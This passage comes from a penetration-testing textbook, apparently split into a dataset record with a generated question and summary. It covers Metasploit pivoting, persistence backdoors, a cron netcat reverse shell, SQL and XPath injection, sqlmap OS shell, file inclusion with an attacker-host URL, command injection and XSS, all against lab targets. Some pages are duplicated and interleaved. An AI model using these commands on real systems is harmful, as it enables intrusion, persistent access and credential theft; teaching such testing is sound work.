1-10000 u, though you can change this option if you wish.\nThough Metasploit’s port scanners are not as powerful as Nmap’s, we\ncan at least see that the SMB port is open. From here we might run the\nauxiliary/scanner/smb/smb_version module followed by the check function with\nthe windows/smb/ms08_067_netapi module to lead us toward exploiting the\nWindows XP target with the MS08-067 exploit through a pivot.\nRunning an Exploit through a Pivot\nBecause our Windows XP and Kali systems are on different networks, a\nreverse payload won’t work for our exploit because the Windows XP target\nwon’t know how to route traffic back to 192.168.20.9. (Of course, if our Kali\nsystem was on the Internet and the internal network we are attacking could\nroute to the Internet, that would not be the case. However, here our host-\nonly network does not know how to route to our bridged network.) Instead,\n306 Chapter 13\nwe’ll use a bind payload. Metasploit’s bind handler will have no trouble rout-\ning through the pivot we set up. The windows/meterpreter/bind_tcp payload\nwill work as shown in Listing 13-30.\nmsf exploit(handler) > use windows/smb/ms08_067_netapi\nmsf exploit(ms08_067_netapi) > set RHOST 172.16.85.190\nRHOST => 172.16.85.190\nmsf exploit(ms08_067_netapi) > set payload windows/meterpreter/bind_tcp\npayload => windows/meterpreter/bind_tcp\nmsf exploit(ms08_067_netapi) > exploit\nListing 13-30: Exploiting through a pivot\nWe’ve gotten another session, this time through a pivot.\nSocks4a and ProxyChains\nPivoting through Metasploit is all well and good, but we’re limited to using\nMetasploit modules. Perhaps there is a way to proxy other tools through\nMetasploit’s pivot? In fact there is: using the ProxyChains tool (which\nredirects traffic to proxy servers) to send our traffic from other Kali tools\nthrough Metasploit.\nBut first we need to set up a proxy server in Metasploit. Like the SMB\nserver module we used to capture NETLM and NETNTLM hashes ear-\nlier in this chapter, Metasploit also has a Socks4a proxy server module\n(auxiliary/server/socks4a). Listing 13-31 shows how to set up the proxy\nserver.\nmsf > use auxiliary/server/socks4a\nmsf auxiliary(socks4a) > show options\nModule options (auxiliary/server/socks4a):\nName Current Setting Required Description\n---- --------------- -------- -----------\nSRVHOST 0.0.0.0 yes The address to listen on\nSRVPORT 1080 yes The port to listen on.\nmsf auxiliary(socks4a) > exploit\n[*] Auxiliary module execution completed\n[*] Starting the socks4a proxy server\nListing 13-31: Setting up a Socks4a proxy server in Metasploit\nLeave the options as the defaults, but note that the server will be listen-\ning on port 1080.\nNow we need to edit the configuration file for ProxyChains at /etc/\nproxychains.conf. Scroll down to the bottom of the file in an editor, and you\nshould see that by default, ProxyChains is set to route traffic to the Tor net-\nwork as shown here.\nPost Exploitation 307\n# add proxy here ...\n# defaults set to “tor”\nsocks4 127.0.0.1 9050\nWe need to change the proxy value to Metasploit’s listening server.\nReplace port 9050 (for Tor) with 1080 (for Metasploit). The line should\nnow read:\nsocks4 127.0.0.1 1080\nSave the configuration file for ProxyChains. Now we can run tools like\nNmap from outside Metasploit against our Windows XP target, as long as we\npreface them with proxychains as shown in Listing 13-32. (The Metasploit\nroute must still be active because ProxyChains simply redirects the traffic\nto Metasploit, which will forward the traffic through the pivot.)\nroot@kali:~# proxychains nmap -Pn -sT -sV -p 445,446 172.16.85.190\nProxyChains-3.1 (http://proxychains.sf.net)\nStarting Nmap 6.40 ( http://nmap.org ) at 2015-03-25 15:00 EDT\n|S-chain|-<>-127.0.0.1:1080-<><>-172.16.85.190.165:445-<><>-OKu\n|S-chain|-<>-127.0.0.1:1080-<><>-172.16.85.190:446-<--deniedv\nNmap scan report for 172.16.85.190\nHost is up (0.32s latency).\n\nPORT STATE SERVICE VERSION\n445/tcp open microsoft-ds Microsoft Windows XP microsoft-ds\n446/tcp closed ddm-rdb\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\nListing 13-32: Running Nmap through ProxyChains\nListing 13-32 shows Nmap being run against the Windows XP host\nthrough the pivot with ProxyChains. The option -Pn tells Nmap not to try\nto ping through the proxy. We start with a simple TCP connect scan (-sT)\nand then run a version scan (-sV). For the sake of simplicity, I’ve limited the\nports to 445 and 446 with the -p option. We see that the connection is OK on\nport 445 u but denied on port 446 v. This makes sense because the SMB\nserver is running on port 445, but nothing is running on port 446. (If any\nof this is unfamiliar, see “Port Scanning with Nmap” on page 125.)\nThis is just one way to run tools external to Metasploit through a pivot.\nWhile doing so does slow things down a bit, it can be quite useful to have\naccess to other tools in Kali.\nnote Not all vulnerabilities will be exploitable through a pivot. In general, it depends on\nhow the vulnerable protocols work. Another technique to look into is SSH tunneling.\nSee my blog at http://www.bulbsecurity.com/ for more information.\n308 Chapter 13\nPersistence\nA great thing about our Meterpreter sessions is also a bad thing. Because\nthe host process resides entirely in memory, if it dies, our Meterpreter ses-\nsion dies as well, and if the system restarts we lose our session. If we lose\nnetwork access to the target, our session may die as well.\nRather than re-exploiting the same vulnerability or resending social-\nengineering attacks, it would be ideal if we had a way to regain access in the\nfuture. Persistence methods can be as simple as adding a user to a system or\nas advanced as kernel-level rootkit that hides itself even from the Windows\nAPI making it virtually undetectable. In this section we’ll look at a few simple\nways to gain persistence on a target system to give you a good starting point\nfor your pentests.\nAdding a User\nPerhaps the simplest way to gain persistence is to add a new user. Being able\nto log in to the system directly via SSH, RDP, and so on makes it easy to access\na system in the future. (As with all other changes you make on your targets,\nremember to delete any added user accounts before finishing the pentest.)\nOn a Windows system, use net user username password /add to add a new\nuser, as shown here.\nC:\\Documents and Settings\\georgia\\Desktop> net user james password /add\nnet user james password /add\nThe command completed successfully.\nWe should also add our new user to the relevant groups with the com-\nmand net localgroup group username /add. For example, if we want to log in\nvia remote desktop, we should add the user to the Remote Desktop Users\ngroup. The Administrators group is also a good group to add our user to as\nshown here.\nC:\\Documents and Settings\\georgia\\Desktop> net localgroup Administrators james /add\nnet localgroup Administrators james /add\nThe command completed successfully.\nIf your client has a Windows domain, you can add users to the domain\nand add them to domain groups (if you have sufficient privileges) by tack-\ning on /domain at the end of a command. For example, if you are able to steal\na domain administrator’s token, you can use the following commands to\nadd a domain administrator account, giving you full control of the entire\ndomain.\nC:\\Documents and Settings\\georgia\\Desktop> net user georgia2 password /add /domain\nC:\\Documents and Settings\\georgia\\Desktop> net group \"Domain Admins\" georgia2 /add /domain\nOn the Linux target, we can use adduser to add a user account. Ideally we\nshould also add our new user to the sudoers group so we have root privileges.\nPost Exploitation 309\nMetasploit Persistence\nThe Meterpreter script persistence automates the creation of a Windows back-\ndoor that will automatically connect back to a Metasploit listener at startup,\nlogin, and so on, based on the options we use when creating it. The options\nfor the persistence script are shown in Listing 13-33.\nmeterpreter > run persistence -h\nMeterpreter Script for creating a persistent backdoor on a target host.",
    "question": "What are the key techniques and tools discussed in the text for bypassing antivirus detection and gaining access to systems for post-exploitation activities?",
    "summary": "Veil-Evasion is a tool that allows the creation of malicious executables to bypass antivirus detection by using encryption and injection methods. It provides 28 payloads, including the VirtualAlloc injection method with AES encryption, which can evade Microsoft Security Essentials. The tool also includes options to check payload hashes against VirusTotal and clean payload folders. Additionally, Metasploit offers various post-exploitation modules for privilege escalation, information gathering, and lateral movement across systems. The chapter discusses techniques like using Meterpreter, the getsystem command, and the Incognito module to steal tokens and gain elevated privileges. It also covers methods for bypassing UAC, using PSExec and SSHExec to access other systems, and leveraging proxy tools like ProxyChains to route traffic through a pivot. Finally, it explores persistence methods, such as adding users to system groups or using Metasploit's persistence script to maintain access."
  },
  {
    "start": 93,
    "end": 95,
    "text": "OPTIONS:\n-A Automatically start a matching multi/handler to connect to the agent\n-L <opt> Location in target host where to write payload to, if none %TEMP% will be used. -P <opt> Payload to use, default is windows/meterpreter/reverse_tcp. -S Automatically start the agent on boot as a service (with SYSTEM privileges)\n-T <opt> Alternate executable template to use\n-U Automatically start the agent when the User logs on\n-X Automatically start the agent when the system boots\n-h This help menu\n-i <opt> The interval in seconds between each connection attempt\n-p <opt> The port on the remote host where Metasploit is listening\n-r <opt> The IP of the system running Metasploit listening for the connect back\nListing 13-33: Meterpreter persistence script\nAs you can see we have a lot of customization options for our persistent\npayload. We can have the persistence agent start at boot or when the user\nlogs in. We can set an interval between attempts to connect to the handler. We can change where the agent is written on the target system. We can also\nspecify the remote host and port for the agent to connect back to. We can\neven have Metasploit automatically set up a handler to catch the incom-\ning connection. In the process of setting up persistence, Metasploit has to\nwrite the persistence agent to the disk, so Meterpreter is no longer com-\npletely residing in memory at this point. When the persistence agent runs at\nstartup (-X), a Visual Basic script is uploaded to the %TEMP% folder, and\na registry entry is added to the list of programs to run at startup. When the\npersistence agent runs upon login (-U), the process is similar, but the regis-\ntry entry is set to run at login. When the persistence agent runs as a service\n(-S), a Windows system service is created that will call the Visual Basic script\nfrom %TEMP%. Let’s run the persistence script, as shown in Listing 13-34, telling the\nagent to connect back to our Kali machine when the user logs in. meterpreter > run persistence -r 192.168.20.9 -p 2345 -U\n[*] Running Persistence Script\n[*] Resource file for cleanup created at /root/.msf4/logs/persistence/BOOKXP_20150814.1154/\nBOOKXP_20150814.1154.rc\n[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345\n[*] Persistent agent script is 614853 bytes long\n[+] Persistent Script written to C:\\WINDOWS\\TEMP\\eTuUwezJblFHz.vbs\n[*] Executing script C:\\WINDOWS\\TEMP\\eTuUwezJblFHz.vbs\n310 Chapter 13\n[+] Agent executed with PID 840\n[*] Installing into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\BJkGfQLhXD\n[+] Installed into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\BJkGfQLhXD\nListing 13-34: Running the persistence script\nAfter running the script, place the Meterpreter session in the back-\nground with the Meterpreter command background, and set up a handler\nto catch the persistence agent. Now restart the Windows XP target. When\nit restarts, log in as georgia, and you should receive another Meterpreter\nsession. note If it doesn’t work the first time, try restarting and logging in again. Creating a Linux cron Job\nOn both Windows and Linux systems, we can automatically start tasks at\na given time. For example, we can set up a cron job to automatically run a\nMetasploit payload or even just use Netcat to connect back to us. Open /etc/crontab on your Linux target. The following line will run the\ncommand nc 192.168.20.9 12345 -e /bin/bash every ten minutes of every hour\nof every day of every month—basically every ten minutes. The command will\nbe run as root. Add this line to the end of the /etc/crontab file. (For help, see\n“Automating Tasks with cron Jobs” on page 72.)\n*/10 * * * * root nc 192.168.20.9 12345 -e /bin/bash\nNow restart the cron service by entering service cron restart. Set up a\nNetcat listener on port 12345 on your Kali machine, and at the next ten-\nminute mark, the cron job should run, and you should receive a root shell at\nyour Netcat listener. summary\nIn this chapter we’ve covered just a few post-exploitation techniques, barely\nskimming the surface of the wealth of interesting tools and techniques\navailable. We looked at some methods for escalating our privileges on an\nexploited system. We also looked at methods of gathering local informa-\ntion. We studied methods of turning access to one system into access to\nmany, including pivoting from one network to another through an open\nsession. Finally, we looked at a couple of methods for making our access\npermanent. Post Exploitation 311\n14\nweB aPPliCation testing\nThough automated scanners are great at finding\nknown vulnerabilities in web applications, many cli-\nents build custom web applications. Sure, commercial\nproducts can automate attacks against user input fields\nin custom web applications, but nothing can replace a\ngood penetration tester with a proxy when it comes to\nfinding security issues in these applications. Like all software, web applications may have issues when input is not\nproperly sanitized. For example, when an application pulls data from a data-\nbase based on certain user input, the application may expect specific input\nsuch as a username and password. If, instead, the user enters special input\nto create additional database queries, he or she may be able to steal data\nfrom the database, bypass authentication, or even execute commands on\nthe underlying system. In this chapter we’ll look at finding some common vulnerabilities in web\napplications using the example web application installed on the Windows 7\ntarget: a simple bookstore with several security issues frequently found in web\napplications. (See “Installing Additional Software” on page 52 for instal-\nlation instructions.)\nusing Burp Proxy\nWe can use a proxy to capture requests and responses between our browser\nand the web application so we can see exactly what data is being transmitted. Kali Linux comes with the free version of Burp Suite, a testing platform for\nweb applications that includes a proxy feature. Burp includes other useful\ncomponents, such as Burp Spider, which can crawl through web application\ncontent and functionality, and Burp Repeater, which allows you to manipu-\nlate and resend requests to the server. For now, we’ll focus on the Burp\nProxy tab. To start Burp Suite in Kali Linux, go to Applications at the top left\nof the Kali GUI, and then click Kali Linux4Web Applications4Web\nApplication Fuzzers4burpsuite, as shown in Figure 14-1. Figure 14-1: Starting Burp Suite in Kali\nClick the Proxy tab, as shown in Figure 14-2. By default, the Intercept\nis on button should be selected so that Burp Suite intercepts and traps any\noutgoing requests from a web browser configured to use Burp as a proxy\nfor web traffic. This setting will allow us to see and even modify the details\nof web requests before they are sent to the server. 314 Chapter 14\nFigure 14-2: Burp Proxy interface\nNow we need to tell our browser in Kali Linux to proxy web traffic\nthrough Burp Suite. 1. Open the Iceweasel browser, go to Edit4Preferences4Advanced, and\nselect the Network tab. 2. Click Settings to the right of Connection. 3. In the Connection Settings dialog, shown in Figure 14-3, select Manual\nproxy configuration, and enter the IP address 127.0.0.1 and port 8080. This tells Iceweasel to proxy traffic through the localhost on port 8080,\nthe default port for Burp Proxy. Figure 14-3: Setting a proxy in Iceweasel\nWeb Application Testing 315\nTo ensure that Iceweasel will proxy all our traffic through Burp Suite,\nbrowse to the URL bookservice on your Windows 7 target: http://192.168.20.12/\nbookservice. The connection should appear to hang in the browser, and the\nbrowser and Burp Suite should light up as the HTTP GET request for the\nmain page of the bookservice site is captured by Burp Proxy, as shown in\nFigure 14-4. Figure 14-4: Captured HTTP GET request\nWe can see the details of the HTTP GET request asking the server for the\nbookservice web page. As we will see later, we can make changes to the request before sending\nit on to the server, but for now, let’s just go ahead and forward the request\n(and any subsequent ones) by clicking the Forward button. Returning to\nthe browser, we see the server has sent us the main page of the bookservice\nsite, as shown in Figure 14-5. 316 Chapter 14\nFigure 14-5: Bookservice site\nNext let’s try signing up for an account (Figure 14-6). Click Login at\nthe top left of the page, and then forward the request to the server from the\nproxy. Do the same to get to the Sign Up page by clicking New User and\nforwarding the request to the server. Figure 14-6: Signing up for a new account\nEnter a username, password, and email address, then submit the request\nby clicking Go. The request should be captured in Burp Proxy, as shown in\nFigure 14-7. Web Application Testing 317\nFigure 14-7: Captured request\nIn addition to looking at the raw request, which is a bit unfriendly to\nread, you can click the Params tab at the top of the request window in Burp\nSuite to display the request parameters in a more readable format, as shown\nin Figure 14-8. Figure 14-8: Request parameters\n318 Chapter 14\nFor example, the new display shows the User field georgia, Pass field\npassword, and Email field georgia@bulbsecurity.com. You can change these fields directly in the proxy. For example, if you\nchange georgia’s password to password1 before forwarding the request to the\nserver, the server will set the password for user georgia to password1, because\nthe server never saw the original request from the browser requesting the\npassword password. The proxy allows you to see the details of any request to the server. If\nat any point you don’t need to proxy traffic, click Intercept is on to toggle\nit to Intercept is off and allow traffic to pass through to the server without\nuser interaction. Switch the button back on if you want to catch a particular\nrequest. sQL injection\nMany web applications store data in a backend, SQL-based database. For\nexample, we encountered a SQL database during our network penetration\ntest, when we found an open MySQL database through phpMyAdmin in the\nXAMPP install on the Windows XP target on page 186. We then used a\nSQL query to write a simple PHP command shell to the web server. We typically won’t have direct access to run SQL queries on a site’s\nbackend database from a web application. However, if a developer fails to\nsanitize user input when interacting with the database, you may find that\nyou can perform a SQL injection attack to manipulate the queries sent to it. Successful SQL injection attacks can read data from the database, modify\ndata, shut down or destroy the database, and, in some cases, even run com-\nmands on the underlying operating system (which can be especially power-\nful because database servers often run as privileged users). A natural place to look for SQL injection issues is in the login page. Many web applications store user data in a database, so we can use a SQL\nquery to pull out the correct user, based on the username and password\nprovided by the user. When developers don’t sanitize user input, we can\nbuild SQL queries to attack the database. An example of an injectable SQL\nstatement that could be leveraged by an attacker is shown here:\nSELECT id FROM users WHERE username='$username' AND password='$password';\nWhat if an attacker supplied a username ' OR '1'='1 and the user’s pass-\nword was ' OR '1'='1? The SQL statement turns into:\nSELECT username FROM users WHERE username='' or '1'='1' AND password='' or '1'='1'\nBecause the OR '1'='1' will always be true, this SELECT statement will now\nreturn the first username in the user table, regardless of the username and\npassword. Web Application Testing 319\nau: inserted space\nin “ms sql” – ok? As we’ll see in “XPath Injection” on page 323, our application uses\nXpath, a query language for XML documents, which authenticates against\nan XML file rather than a database, though the injection process is similar. However, our application does use a SQL database to store records of the\nbooks available in the store, and when we select a book on the main page,\nits details are pulled from an MS SQL backend database.\n\nFor example,\nclick the More Details link for the first book on the site, Don’t Make Me\nThink. The URL requested is:\nhttp://192.168.20.12/bookservice/bookdetail.aspx?id=1\nThe book’s details are filled in based on the results returned from the\ndatabase query for the record with ID 1. Testing for SQL Injection Vulnerabilities\nA typical first test for SQL injection vulnerabilities is to use a single quotation\nmark to close the SQL query. If a SQL injection vulnerability is present, the\naddition of that quotation mark should cause the application to throw a SQL\nerror, because the query will already be closed as part of the underlying\ncode and the extra single quote will cause the SQL syntax to be incorrect. That error will tell us that we can inject SQL queries to the site’s database\nusing the id parameter. Let’s try this out by sending the query again with the id parameter to 1',\nas shown here. http://192.168.20.12/bookservice/bookdetail.aspx?id=1'\nAs expected, the application serves an error page indicating that our\nSQL syntax is incorrect, as shown in Figure 14-9. Figure 14-9: The application identifies a SQL error. In particular, note the message “Unclosed quotation mark after the\ncharacter string” in our SQL query. 320 Chapter 14\nau: inserted space\nin “ms sql” – ok? As we’ll see in “XPath Injection” on page 323, our application uses note Not all applications that are vulnerable to SQL injection will be so verbose with their\nXpath, a query language for XML documents, which authenticates against error messages. In fact, there is a whole class of blind SQL injection vulnerabilities,\nan XML file rather than a database, though the injection process is similar. where error messages detailing the injection are not shown, even though the injection\nHowever, our application does use a SQL database to store records of the flaw is still present. books available in the store, and when we select a book on the main page,\nits details are pulled from an MS SQL backend database. For example,\nExploiting SQL Injection Vulnerabilities\nclick the More Details link for the first book on the site, Don’t Make Me\nThink. The URL requested is: Now that we know a SQL injection vulnerability is present in this site, we\ncan exploit it to run additional queries on the database that the developer\nhttp://192.168.20.12/bookservice/bookdetail.aspx?id=1 never intended. For example, we can find out the name of the first database\nwith the following query:\nThe book’s details are filled in based on the results returned from the\ndatabase query for the record with ID 1. http://192.168.20.12/bookservice/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0))--\nTesting for SQL Injection Vulnerabilities The query throws an error message, Conversion failed when converting the\nnvarchar value ‘BookApp’ to data type int, which tells us that the name of the first\nA typical first test for SQL injection vulnerabilities is to use a single quotation\ndatabase is BookApp, as shown in Figure 14-10. mark to close the SQL query. If a SQL injection vulnerability is present, the\naddition of that quotation mark should cause the application to throw a SQL\nerror, because the query will already be closed as part of the underlying\ncode and the extra single quote will cause the SQL syntax to be incorrect. That error will tell us that we can inject SQL queries to the site’s database\nusing the id parameter. Let’s try this out by sending the query again with the id parameter to 1',\nas shown here. http://192.168.20.12/bookservice/bookdetail.aspx?id=1'\nAs expected, the application serves an error page indicating that our\nSQL syntax is incorrect, as shown in Figure 14-9. Figure 14-10: Error message showing the database name\nUsing SQLMap\nWe can also use tools to automatically generate SQL queries to perform var-\nious tasks on a site using SQL injection. All we need is an injection point;\nthe tool does the rest. For example, Listing 14-1 shows how when we give a\ntool in Kali SQLMap a potentially injectable URL, SQLMap tests for SQL\ninjection vulnerabilities and performs injection queries. root@kali:~# sqlmap -uu \"http://192.168.20.12/bookservice/bookdetail.aspx?id=2\" --dumpv\n--snip--\nFigure 14-9: The application identifies a SQL error. [21:18:10] [INFO] GET parameter 'id' is 'Microsoft SQL Server/Sybase stacked queries' injectable\n--snip--\nIn particular, note the message “Unclosed quotation mark after the Database: BookApp\nTable: dbo.BOOKMASTER\ncharacter string” in our SQL query. [9 entries]\n+--------+---------------+-------+-------+-------------------------------------\nWeb Application Testing 321\n| BOOKID | ISBN | PRICE | PAGES | PUBNAME | BOOKNAME\n| FILENAME | AUTHNAME | DESCRIPTION\n|\n+--------+---------------+-------+-------+-------------------------------------\n| 1 | 9780470412343 | 11.33 | 140 | Que; 1st edition (October 23, 2000) | Do not Make\nMe Think A Common Sense Approach to Web Usability |\n4189W8B2NXL.jpg | Steve Krug and Roger Black | All of the tips, techniques, and examples\npresented revolve around users being able to surf merrily through a well-designed site\nwith minimal cognitive strain. Readers will quickly come to agree with many of the books\nassumptions, such as We do not read pages--we scan them and We do not figure out how things\nwork--we muddle through. Coming to grips with such hard facts sets the stage for Web design\nthat then produces topnotch sites. |\n--snip-- |\nListing 14-1: Dumping the database with SQLMap\nSpecify the URL to test with -u option u. The --dump option v dumps\nthe contents of the database—in this case, details of the books. We can also use SQLMap to try to get command-shell access on the\nunderlying system. MS SQL databases contain a stored procedure called\nxp_cmdshell, which will give us command-shell access, but it’s often disabled. Luckily, SQLMap will try to reenable it. Listing 14-2 shows how we can get\na command shell on the site’s underlying Windows 7 target system using\nSQLMap. root@kali:~# sqlmap -u \"http://192.168.20.12/bookservice/bookdetail.aspx?id=2\" --os-shell\n--snip--\nxp_cmdshell extended procedure does not seem to be available. Do you want sqlmap to try to\nre-enable it? [Y/n] Y\n--snip--\nos-shell> whoami\ndo you want to retrieve the command standard output? [Y/n/a] Y\ncommand standard output: 'nt authority\\system'\nListing 14-2: xp_cmdshell access through SQL injection\nAs you can see in Listing 14-2, we receive a shell running as System with-\nout having to guess credentials for the database. note The MS SQL database is not listening on a port anyway, so we can’t access it directly. Unlike our Windows XP system in Chapter 6, this web server lacks phpMyAdmin, so\nwe have no other way to access the database. A SQL injection issue in the hosted web-\nsite gives us full system access. 322 Chapter 14\nxPath injection\nAs mentioned previously, this bookservice application uses XML authen-\ntication, in which the XML is queried using Xpath. We can use XPath\ninjection to attack XML. Though its syntax differs from SQL, the injection\nprocess is similar. For example, try entering single quotes (') for both the username and\npassword fields at the login page. You should receive an error like the one\nshown in Figure 14-11. Figure 14-11: XML error at login\nAs you can see from the error message shown in Figure 14-11, we again\nhave an injection issue because we have an error in our syntax. Because\nwe are at a login page, a typical injection strategy for Xpath would be to\nattempt to bypass authentication and gain access to the authenticated por-\ntion of the application by attacking the Xpath query logic. For example, as shown in the error details, the login query grabs the\nusername and password provided, and then compares the values provided\nagainst credentials in an XML file. Can we create a query to bypass the\nneed for valid credentials? Enter a set of dummy credentials at login, and\ncapture the request with Burp Proxy, as shown in Figure 14-12. Now change the txtUser and txtPass parameters in the captured request\nto this value. ' or '1'='1\nWeb Application Testing 323\nFigure 14-12: Captured login request\nThis tells the login Xpath query to find the user account where the\nusername and password field is blank or 1=1. Because 1=1 always evaluates\nas true, the logic of this query says to return the user where the username\nis blank or present—likewise with the password. Thus using this injection\nmethod, we can get the application to log us in as the first user in the authen-\ntication file. And, as shown in Figure 14-13, we are logged in as the user Mike. Figure 14-13: Authentication bypass through Xpath injection\nLocal File inclusion\nAnother vulnerability commonly found in web applications is local file inclu-\nsion, which is the ability to read files from the application or the rest of the\nfilesystem that we should not have access to through the web app. We saw an\nexample of this in Chapter 8 where the Zervit web server on the Windows XP\ntarget allowed us to download files from the target, such as a backup of the\nSAM and SYSTEM hives. Our bookservice app also suffers from local file inclusion. As user Mike,\ngo to Profile4View Newsletters. Click the first newsletter in the list to view\nthe contents of the file, as shown in Figure 14-14. 324 Chapter 14\nFigure 14-14: Viewing a newsletter\nNow resend the request, and capture it with Burp Proxy, as shown in\nFigure 14-15. Figure 14-15: Captured newsletter request\nClick the Params tab, and note the parameter c:\\inetpub\\wwwroot\\Book\\\nNewsLetter\\Mike@Mike.com\\Web Hacking Review.txt. The path c:\\inetpub\\wwwroot\\\nBook\\NewsLetter\\Mike suggests that the newsletter functionality is pulling the\nnewsletters from the local filesystem by their absolute path. It also looks like\nthere’s a folder called Mike@Mike.com in the Newsletter folder. Perhaps each\nuser subscribed to the newsletters has such as folder. It also seems as if our application is actually at the path c:\\inetpub\\\nwwwroot\\Book, as noted in the newsletter requests, instead of c:\\inetpub\\\nwwwroot\\bookservice as we might expect from the URL. We note this\nbecause it may come in handy later on. Web Application Testing 325\nWhat if we change the filename parameter to another file in the web\napplication? Can we gain access to the app’s full source code? For example,\nchange the file to the following, and forward the request to the server. C:\\inetpub\\wwwroot\\Book\\Search.aspx\nAs you can see, the source\ncode of the Search.aspx page\nis displayed in the Newsletter\nbox, as shown in Figure 14-16. Having access to the full\nserver-side source code of the\nweb application allows us to do\na complete source code review\nto look for issues. But perhaps we can access\neven more sensitive data. For\nexample, we know that the\nusernames and passwords are\nstored in an XML file. Perhaps\nwe can request this file. We\nFigure 14-16: Local file inclusion vulnerability\ndon’t know its name, but a few\nguesses for common filenames\nin XML authentication scenar-\nios will lead us to the filename AuthInfo.xml. Capture the newsletter request\nin Burp Proxy, and change the requested file to the one shown here. C:\\inetpub\\wwwroot\\Book\\AuthInfo.xml\nAs you can see in Figure\n14-17, we now have access to\nthe usernames and passwords\nin plaintext. Now we know why\nour previous Xpath injection\nlogged us in as the user Mike:\nMike is the first user in the file. This is a prime example\nof when using a proxy comes\nin handy. A user with just a\nbrowser would have been lim-\nited to only the files he or she\ncould click on, namely the\nnewsletters presented. On the\nother hand, with the proxy\nFigure 14-17: Authentication info\nwe are able to see the request\nask for a specific file from the\n326 Chapter 14\nfilesystem. By changing the filename manually in the request using Burp\nProxy, we were able to see other sensitive files. No doubt the developer did\nnot consider the possibility that the user could just ask for any file and,\nthus, did not think to limit the files that could be accessed through the\nuser’s newsletters. Worse still, we aren’t limited to files from the web application.\n\nWe can\nload any file from the filesystem that the IIS_USER has read access to. For\nexample, if you create a file called secret.txt on the C: drive, you can load it\nthrough the newsletters functionality. Just substitute the file you want in the\nrequest in Burp Suite. If we can find a way to upload files to a web applica-\ntion, we can even use LFI vulnerability to execute malicious code on the\nwebserver. remote File inclusion\nRemote file inclusion (RFI) vulnerabilities allow attackers to load and\nexecute malicious scripts, hosted elsewhere, on a vulnerable server. In\nChapter 8, we used the open phpMyAdmin interface in XAMPP to write a\nsimple PHP shell and finally a PHP version of Meterpreter to the web server. Though we are not uploading a file to the server here, the attack is similar. If we can trick the vulnerable server into executing a remote script, we can\nrun commands on the underlying system. Our site does not have a remote file inclusion vulnerability, but simple\nvulnerable PHP code is shown here as an illustration. <?php\ninclude($_GET[‘file’]);\n?>\nAn attacker can host a malicious PHP script (such as the meterpreter.php\nscript we used in Chapter 8) on their webserver and request the page with the\nfile parameter set to http://<attacker_ip>/meterpreter.php. The RFI vulnerability\nwould cause meterpreter.php to be executed by the webserver even though it is\nhosted elsewhere. Of course, our example application is ASP.net not PHP, but\nMsfvenom can create payloads in ASPX format for these sorts of apps. Command execution\nAs noted earlier, the Newsletters folder contains a folder called Mike@Mike\n.com. Logically, this suggests that the site may contain similar folders with\nthe email addresses of all users signed up to receive newsletters. Some part\nof the application must be creating these folders as users register or sign\nup for the newsletter. The application’s code is probably running a com-\nmand to create the folders on the filesystem. Perhaps, again through lack of\ninput validation, we can run additional commands that the developer never\nintended us to run. Web Application Testing 327\nAs shown in Figure 14-18, the bottom\nright of the web app contains a form to sign\nup for newsletters. We suspect that when we\nenter an email address, a folder is created for\nthat email address in the newsletters folder. We guess that the email address input is\nfed to a system command to create a direc-\ntory in the newsletters folder. If the developer\ndoes not properly sanitize user input, we may\nbe able to run additional commands using\nthe ampersand (&) symbol. Figure 14-18: Newsletter\nWe’ll execute a command and send Signup\nits output to a file in our application’s\nC:\\inetpub\\wwwroot\\Book\\ directory, then\naccess the files directly to see the command’s\noutput. Run the ipconfig command on the Windows 7 target as shown here\nto pipe the output from a system command such as ipconfig to the file test.txt\nin the Book directory. georgia@bulbsecurity.com & ipconfig > C:\\inetpub\\wwwroot\\Book\\test.txt\nWhen we browse to http://192.168.20.12/bookservice/test.txt, we see the\noutput of our ipconfig command, as shown in Figure 14-19. Figure 14-19: Command execution output\n328 Chapter 14\nWe will be limited to the privileges of the Internet Information Services\n(IIS) user. Unfortunately for us, the Microsoft IIS application on Windows 7\nsystems runs as a separate account without the full privileges of a system\nuser: a better security scenario for the developer but a more challenging\none for us. Though we don’t have full access, we will be able to gather a lot of\ninformation about the system with the access we do have. For example, we\ncan use the dir command to find interesting files, or the command netsh\nadvfirewall firewall show rule name=all to see the rules in the Windows\nfirewall. Since we are on a Windows system we cannot use wget from the com-\nmand line to pull down an interactive shell, but we can use various other\nmethods to do so. In Chapter 8 we used TFTP to transfer a shell from our\nKali system to the Windows XP target. Windows 7 does not have a TFTP\nclient installed by default, but in Windows 7 we do have a powerful scripting\nlanguage called Powershell, which we can use for tasks such as downloading\nand executing a file. note A study of Powershell is outside of the scope of this book, but it is very helpful for post\nexploitation on the latest Windows operating systems. A good reference can be found\nhere: http://www.darkoperator.com/powershellbasics/. Cross-site scripting\nPerhaps the most common and most debated web application security vul-\nnerability is cross-site scripting (XSS). When such vulnerabilities are pres-\nent, attackers can inject malicious scripts into an otherwise innocuous site\nto be executed in the user’s browser. XSS attacks are typically broken into two categories: stored and reflected. Stored XSS attacks are stored on the server and executed whenever a user visits\nthe page where the script is stored. User forums, reviews, and other places\nwhere users can save input displayed to other users are ideal places for these\nsorts of attacks. Reflective XSS attacks are not stored on the server but are cre-\nated by sending requests with the XSS attack itself. The attacks occur when\nuser input is included in the server’s response, for example, in error messages\nor search results. Reflected XSS attacks rely on a user sending a request with the XSS\nattack included, so there will likely be some sort of social-engineering com-\nponent to the attack as well. In fact, having XSS might actually increase the\nsuccess of a social-engineering attack, because you can craft a URL that is\npart of a real website—a website the user knows and trusts—and use the\nXSS to, for instance, redirect the user to a malicious page. Like the other\nattacks discussed in this chapter, XSS attacks rely on a lack of user input\nsanitation, which allows us to create and run a malicious script. Web Application Testing 329\nChecking for a Reflected XSS Vulnerability\nWe should check any user input for XSS vulnerabilities. We’ll find that our\napplication has a reflected XSS vulnerability in the search functionality. Try\nsearching for the title xss in the Books Search box, as shown in Figure 14-20. As shown in Figure 14-21, the search results page prints the original\nuser input as part of the results. If the user input is not properly sanitized,\nthis may be where we can use XSS. Figure 14-20: Search Figure 14-21: Search results page\nfunction\nThe typical first XSS test to try to run is a JavaScript alert box. The\nfollowing code will attempt to put up a JavaScript alert with the text xss. If\nuser input is not properly filtered, the script will be executed as part of the\nsearch results page. <script>alert('xss');</script>\nIn some cases, the user’s browser will auto-\nmatically block obvious XSS attacks such as this\none, and Iceweasel is one such browser. Switch over\nto your 